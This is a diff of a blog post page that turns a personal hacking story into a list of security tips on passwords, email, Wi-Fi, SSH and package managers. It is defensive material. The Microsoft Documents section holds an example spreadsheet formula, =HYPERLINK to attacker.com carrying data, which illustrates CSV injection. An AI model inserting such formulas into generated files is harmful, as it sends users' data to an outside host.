@@ -12,7 +12,7 @@
     <link rel="alternative" href="/atom.xml" title="Adrian Mejia Blog" type="application/atom+xml">
 
     
-    <title>I got Hacked and It changed my life | Adrian Mejia Blog</title>
+    <title>45 Secucirty Tips to Avoid Hacking | Adrian Mejia Blog</title>
 
     <!-- Favicons -->
     <link rel="apple-touch-icon-precomposed" sizes="57x57" href="/apple-touch-icon-57x57.png">
@@ -44,7 +44,7 @@
     <meta property="og:type" content="article">
     <meta property="og:description" content="Adrian Mejia blog about programming and software engineering. Featuring MEAN stack (AngularJS, NodeJS, MongoDB and Express), BackboneJS, RESTful APIs, Algorithms and data structures.">
     <meta property="og:image" content="https://adrianmejia.com/images/i-got-hacked-change-life-security-tips-large.jpg">
-    <meta property="og:title" content="I got Hacked and It changed my life">
+    <meta property="og:title" content="45 Secucirty Tips to Avoid Hacking">
     <meta property="fb:app_id" content="761831487293468">
     <meta property="fb:admins" content="895685163">
     <!-- /Open Graph -->
@@ -251,7 +251,7 @@ ga('send', 'pageview');
     "@type": "WebPage",
     "@id": ""
   },
-  "headline": "I got Hacked and It changed my life",
+  "headline": "45 Secucirty Tips to Avoid Hacking",
   
   "image": {
     "@type": "ImageObject",
@@ -287,7 +287,7 @@ ga('send', 'pageview');
     <div class="muted">
       <a class="category-link" href="/categories/Miscellaneous/">Miscellaneous</a>
     </div>
-    <h1>I got Hacked and It changed my life</h1>
+    <h1>45 Secucirty Tips to Avoid Hacking</h1>
     <div class="muted">
       <span title="Last time this post was updated">
         <i class="fa fa-calendar" aria-hidden="true"></i>
@@ -298,7 +298,7 @@ ga('send', 'pageview');
       
         <span class="m-x-2" title="Pageviews">
           <i class="fa fa-eye" aria-hidden="true"></i>
-          0.4k
+          0.3k
         </span>
       
 
@@ -322,7 +322,7 @@ ga('send', 'pageview');
       <picture>
         <source media="(min-width: 728px)" srcset="/images/i-got-hacked-change-life-security-tips-large.jpg">
         <source srcset="/images/i-got-hacked-change-life-security-tips-small.jpg">
-        <img src="/images/i-got-hacked-change-life-security-tips-large.jpg" alt="I got Hacked and It changed my life">
+        <img src="/images/i-got-hacked-change-life-security-tips-large.jpg" alt="45 Secucirty Tips to Avoid Hacking">
       </picture>
     
   </div>
@@ -331,14 +331,17 @@ ga('send', 'pageview');
     <section class="col-sm-8 p-x-2">
 
       <div class="post-content  toc-content ">
-        <p>I got hacked, and it changed my life’s <strong>perspective</strong> <strong>on security</strong>. Here’s a compilation of something that happened to me and some security tips to prevent it.</p>
-<h1 id="Hack-incident">Hack incident<a href="#Hack-incident" class="headerlink" title="Hack incident"></a></h1><p>I’ve been very chill about security most of my life. I’m 32, and I never got my social media hacked or emails. However, something that changed when I set up a personal server on the cloud and I got an intruder!</p>
-<p>This server was collecting data from financial markets (just for fun and to play with some backtracking strategies). One day, I check the data as usual, and It was empty! I was in shock! What happened!? 👀</p>
-<p>I reviewed the authentication logs and found out thousands of attempts to log in to my server! 🤯 I saw attempts from everywhere: France, Rusia, Canada, Germany, China, and other countries! Fortunately, none of this got in. However, I still got hacked, how? 🤔</p>
+        <p>I got hacked, and it changed my life’s <strong>perspective</strong> <strong>on security</strong>. Here’s a compilation of something that happened to me and some security tips to minimize this kind of surprises.</p>
+<details>
+  <summary>Hack incident details... (click to expand)</summary>
+
+<h1 id="Hack-incident"><a href="#Hack-incident" class="headerlink" title="Hack incident"></a>Hack incident</h1><p>I’ve been very chill about security most of my life. I’m 32, and I never got my social media hacked or emails. However, something that changed when I set up a personal server on the cloud and I got an intruder!</p>
+<p>This server was collecting data from financial markets (just for fun and to play with some backtracking strategies). One day, I check the database as usual, and It was empty! I was in shock! What happened!? 👀</p>
+<p>I reviewed the authentication logs and found out thousands of attempts to log in to my server! 🤯 I saw efforts from everywhere: France, Rusia, Canada, Germany, China, and other countries! Fortunately, none of this got in. However, I still got hacked. How? 🤔</p>
 <p>It turns out that when I set up the database, I didn’t bother to change the default configuration. It wouldn’t do that for work but since it was a personal project and the data was public anyway, so I didn’t care too much. I also thought “Meh, nobody is going to find it. I don’t have this IP published anywhere”. However, I was wrong. People/bots did find it and tons of them!</p>
 <p>So I learned the following. There are people/organizations which scan every possible IP address. It doesn’t matter if it is listed anywhere or not. Hackers/bots will scan any known port on every IP address and hope people leave defaults open.</p>
-<p>Hackers will try to log in into your server and try very common usernames (<code>pi</code>, <code>linode</code>, <code>root</code>, <code>admin</code>, etc.) and default passwords. They also attempt to connect to any possible database on their default ports. This not being paranoid, I was able to see all the attempts from the logs.</p>
-<p>I’m glad they drop my database, so I noticed what happened. Hackers could keep login to my server for years, and I probably wouldn’t notice for a long time. That might be happening right now. Many companies have their servers compromised, and they don’t even know it. When they realized it, it’s already late, and then you see the news about it.</p>
+<p>Hackers will try to log in into your server and try very common usernames (<code>pi</code>, <code>linode</code>, <code>root</code>, <code>admin</code>, etc.) and default passwords. They also attempt to connect to any possible database on their default ports. I was able to see all the attempts from the logs!</p>
+<p>I’m glad they drop my database, so I noticed what happened. Hackers could keep login to my server for years, and I probably wouldn’t see for a long time. Many companies have their servers compromised, and they don’t even know it. When they realized it, it’s already late, and then you see the news about it.</p>
 <p>Some examples of data breaches:</p>
 <ul>
 <li>In 2013, <strong>Yahoo</strong> 3 billion users and <strong>Target</strong> with 110 credit cards.</li>
@@ -347,37 +350,40 @@ ga('send', 'pageview');
 <li>Even banks get hacked like the JP Morgan <strong>Chase</strong> on 2014 with 76 million households and 7 million businesses.</li>
 <li>Not even security companies are exempt like <strong>RSA Security</strong> in 2011 with 40 million employee records stolen.</li>
 </ul>
-<p>As you can see, the cybercriminals are real, and everything that you have connected to the Internet is their target. No company or person can 100% prevent being hacked. However, you can make it way more difficult and reduce the chances to 1 in 1000 years, which is pretty good.</p>
-<p>For instance, just your password length and special character alone can tell how long would take to break it:</p>
+</details>
+
+<h1 id="Security-Tips"><a href="#Security-Tips" class="headerlink" title="Security Tips"></a>Security Tips</h1><p>Cybercriminals are real, and everything that you have connected to the Internet is their target. No company or person can 100% prevent getting hacked. However, you can make it way more difficult and reduce the chances to 1 in 1000 years, which is pretty good.</p>
+<p>For instance, your password length and unique character alone can tell how long it would take to break it:</p>
 <ul>
 <li>If your password is <code>Password</code> takes around 0.29 seconds to break.</li>
 <li>If your password is <code>P@ssw0rd</code> takes around 14 years.</li>
 <li>If your password has 12 characters <code>abcdefghijkl</code> it takes 200 years to generate it.</li>
-<li>This password <code>P@ssw0rd123456!!</code> would take more than hundreds of thousand years to hack.</li>
+<li>This password <code>P@ssw0rd123456!!</code> would take more than hundreds of thousand years to decipher.</li>
 </ul>
-<h1 id="Security-Tips">Security Tips<a href="#Security-Tips" class="headerlink" title="Security Tips"></a></h1><p>Here are my 67 security tips on bullet points.</p>
-<h2 id="Generic-tips">Generic tips<a href="#Generic-tips" class="headerlink" title="Generic tips"></a></h2><ul>
+<p>Here are my security tips on how to minimize hacking. It goes from generic usable for mostly everyone to server setup recommendations.</p>
+<h2 id="Generic-tips"><a href="#Generic-tips" class="headerlink" title="Generic tips"></a>Generic tips</h2><ul>
 <li>Use different passwords for everything. If you use the same password for everything some website gets compromised (e.g., Amazon), then everything that has the same user and password will be at risk. I know it’s a hassle to remember all, but you don’t have to. Use a password manager like Bitwarden, 1Password, LastPass, Dashlane or even Google Chrome built-in password manager.</li>
 <li>Use long passwords with special characters. If you are using a password manager, you can ask to auto-generate a secure password.</li>
-<li>Use <strong> 2-factor authentication</strong> whenever is available.</li>
+<li>Use ** 2-factor authentication** whenever is available.</li>
 <li>Enable all security features on the services that you use.</li>
 <li>Everything that runs arbitrary code on your computer should not be trusted.</li>
 <li>Don’t trust defaults blindly verify if there’s a more secure option.</li>
 <li>Keep all your devices, operating systems and dependencies up-to-date. Most well-known vulnerabilities are fixed shortly after they are reported.</li>
 </ul>
-<h2 id="Email-security-tips">Email security tips<a href="#Email-security-tips" class="headerlink" title="Email security tips"></a></h2><ul>
-<li>Have <strong> 2-factor authentication</strong> on your emails. If someone gets access to your primary email, then they can use <code>forgot password</code> on many sites (Evernote, Bank Accounts) and change the password. I heard of somebody that got their email compromised, in turn, the hacker got access to their Evernote and found some passwords to their cryptocurrency exchanges and got robbed big time. Don’t be that guy. Enable 2FA.</li>
+<h2 id="Email-security-tips"><a href="#Email-security-tips" class="headerlink" title="Email security tips"></a>Email security tips</h2><ul>
+<li>Have ** 2-factor authentication** on your emails. If someone gets access to your primary email, then they can use <code>forgot password</code> on many sites (Evernote, Bank Accounts) and change the password. I heard of somebody that got their email compromised; in turn, the hacker got access to their Evernote and found some passwords to their cryptocurrency exchanges and got robbed big time. Don’t be that guy. Enable 2FA.</li>
 <li>Be aware of phishing emails. No, Bill Gates won’t share his fortune and donate you a million, nor you won any lottery. Don’t trust any email saying that you won money or any price. Also, be aware of fake company emails asking for you to log in somewhere. The site might look very similar, but it’s a trap! They want to capture your password. Check the domain carefully or even better yet don’t click on any link from the email and type your company web address directly as you usually do.</li>
-<li>Be aware of malicious attachments. Specially executables (<em>.exe, </em>.bat, <em>.sh, </em>.zip). See also Microsoft documents part. Everything that can run arbitrary code on your computer should not be trusted.</li>
+<li>Be aware of malicious attachments. Specially executables (*.exe, *.bat, *.sh, *.zip). See also Microsoft documents part. Everything that can run arbitrary code on your computer should not be trusted.</li>
 </ul>
-<h2 id="Social-Media">Social Media<a href="#Social-Media" class="headerlink" title="Social Media"></a></h2><ul>
+<h2 id="Social-Media"><a href="#Social-Media" class="headerlink" title="Social Media"></a>Social Media</h2><ul>
 <li>Enable all the security options they have like 2 Factor authentication, SMS confirmation.</li>
+<li>Don’t share passwords with your friends or change them afterwards.</li>
 </ul>
-<h2 id="Microsoft-Documents">Microsoft Documents<a href="#Microsoft-Documents" class="headerlink" title="Microsoft Documents"></a></h2><ul>
+<h2 id="Microsoft-Documents"><a href="#Microsoft-Documents" class="headerlink" title="Microsoft Documents"></a>Microsoft Documents</h2><ul>
 <li>If you use your documents locally or by trusted peers, you shouldn’t have many problems. However, for auto-generated documents like (*.csv) that you download from emails or compromised websites they can change data or insert malicious links (<code>=HYPERLINK(&quot;[http://attacker.com?some=&#39;data](http://attacker.com/?some=%27data%27)&#39;)</code>) and take you to their websites.</li>
 <li>Be aware of macros. They are code that automatically runs when you open the program. In modern versions, Office alerts you when a doc has a macro, and now they are disabled by default.</li>
 </ul>
-<h2 id="Wifi-security-tips">Wifi security tips<a href="#Wifi-security-tips" class="headerlink" title="Wifi security tips"></a></h2><ul>
+<h2 id="Wifi-security-tips"><a href="#Wifi-security-tips" class="headerlink" title="Wifi security tips"></a>Wifi security tips</h2><ul>
 <li>Use a password for your wifi. If you leave it open anybody connects to it can have access to your computers, cell phones, tablets, and smart fridge or cameras.</li>
 <li>Use strong encryption for Wifi. Don’t use WEP encryption. Use  WPA or the newer WPA2. WEP can be cracked relatively quickly using some programs.</li>
 <li>Use a strong password. It makes it harder to break.</li>
@@ -390,8 +396,8 @@ ga('send', 'pageview');
 </ul>
 </li>
 </ul>
-<h2 id="Developers-security-tips">Developers security tips<a href="#Developers-security-tips" class="headerlink" title="Developers security tips"></a></h2><ul>
-<li>Keep all your operating systems and dependencies up-to-date. As vulnerabilities are reported, they are fixed in newer versions.</li>
+<h2 id="Developers-security-tips"><a href="#Developers-security-tips" class="headerlink" title="Developers security tips"></a>Developers security tips</h2><ul>
+<li>Keep all your operating systems and dependencies up-to-date. Maintainers usually patch their software after vulnerabilities come to light.</li>
 <li>Use latest encryption protocols TLS (rather than older SSL versions)<ul>
 <li>Use SFTP instead of FTP</li>
 <li>Use SSH instead of telnet</li>
@@ -400,9 +406,9 @@ ga('send', 'pageview');
 </li>
 <li>Disable direct root login in SSH. You can escalate if needed using <code>sudo</code>.</li>
 <li>Disable SSH connection with passwords. Use ssh private key to log in instead.</li>
-<li>Use firewalls to block any port that you are not using. Firewalls minimize the surface of attack. For Linux, you can use <code>UFW</code>; other option is <code>iptables</code>.</li>
+<li>Use firewalls to block any port that you are not using. Firewalls minimize the surface of attack. For Linux, you can use <code>UFW</code>; another option is <code>iptables</code>.</li>
 <li>Use VPN and private networks. If you don’t need to expose a database to the internet, even better. Make it only accessible for your private network or VPN.</li>
-<li>Don’t trust default configuration of programs facing the internet. Change default ports on databases, ssh.<ul>
+<li>Don’t trust the default configuration of programs facing the internet. Change default ports on databases, ssh.<ul>
 <li>Instead of logging <code>ssh</code> on port <code>22</code>. Use port <code>2146</code> for instance. I did this and noticed how the attempts of login went from hundreds to zero.</li>
 <li>Instead of running MongoDB on port <code>27017</code>, use <code>56073</code></li>
 </ul>
@@ -420,12 +426,13 @@ ga('send', 'pageview');
 </ul>
 </li>
 <li>Be aware of package managers. To name a few Node’s NPM, Ruby Gems and Mac’s <a href="http://brew.sh" target="_blank" rel="noopener">brew.sh</a>. If someone gets access to the administrator password of popular packages you might be at risk.<ul>
-<li>NPM has scripts that can run arbitrary code when something is installed: <a href="https://docs.npmjs.com/misc/scripts#examples" target="_blank" rel="noopener">postinstall</a>. Similarly,  Ruby Gems ha a <code>post_install</code> hook. This script has access to your whole file system, ssh keys and nothing prevent them from sending them to a remote server.</li>
-<li>Brew adds binaries on your <code>/usr/local</code> and modifies the <code>PATH</code>, so this location has the preference. That change could make malicious programs run before the original program.</li>
+<li>NPM has scripts that can run arbitrary code when you install packages. Take a look at <a href="https://docs.npmjs.com/misc/scripts#examples" target="_blank" rel="noopener">postinstall</a>. Similarly,  Ruby Gems has a <code>post_install</code> hook. This script has access to your whole file system, ssh keys and nothing prevent them from sending them to a remote server. Just be aware.</li>
+<li>Brew.sh adds binaries on your <code>/usr/local</code> and modifies the <code>PATH</code>, so this location has the preference. That change could make malicious programs run before the original program.</li>
 </ul>
 </li>
 <li>Finally, never trust anything that comes from the user/internet.  If you are running a web form, sanitize the inputs (strip out malicious scripts).</li>
 </ul>
+<p>Be safe!</p>
 
       </div>
 
@@ -638,8 +645,8 @@ ga('send', 'pageview');
       <div class="container">
         <div class="p-y-2">
           &copy; 2019 <a href="http://adrianmejia.com">Adrian Mejia</a>
-          <span class="muted m-x-4" title="Thu Feb 21 2019 19:18:42 GMT-0500 (Eastern Standard Time)">
-            v.pnawv6
+          <span class="muted m-x-4" title="Sat Feb 23 2019 20:56:28 GMT-0500 (Eastern Standard Time)">
+            v.pneqq4
           </span>
         </div>
       </div>
